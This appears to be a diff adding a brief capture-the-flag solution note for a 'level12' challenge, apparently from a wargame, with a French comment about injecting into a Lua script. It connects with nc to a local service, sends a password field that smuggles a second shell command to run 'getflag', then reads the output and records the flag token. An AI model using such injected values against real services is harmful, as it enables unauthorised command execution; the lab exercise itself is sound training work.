@@ -1,0 +1,8 @@
+#injection du script lua
+nc 127.0.0.1 5151
+
+Password: "" ; getflag > /tmp/flag ; echo ""
+
+cat /tmp/flag
+level12 = fa6v5ateaw21peobuub8ipe6s
+
